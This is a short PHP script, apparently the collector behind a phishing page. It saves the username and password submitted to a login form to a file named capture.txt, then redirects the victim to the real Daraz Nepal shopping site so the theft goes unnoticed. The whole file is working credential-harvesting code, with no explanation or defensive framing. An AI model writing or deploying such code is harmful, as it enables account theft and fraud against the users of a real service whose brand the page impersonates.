<?php
file_put_contents("capture.txt", "[EMAIL]: " . $_POST['username'] . " [PASSWORD]: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://daraz.com.np');
exit();
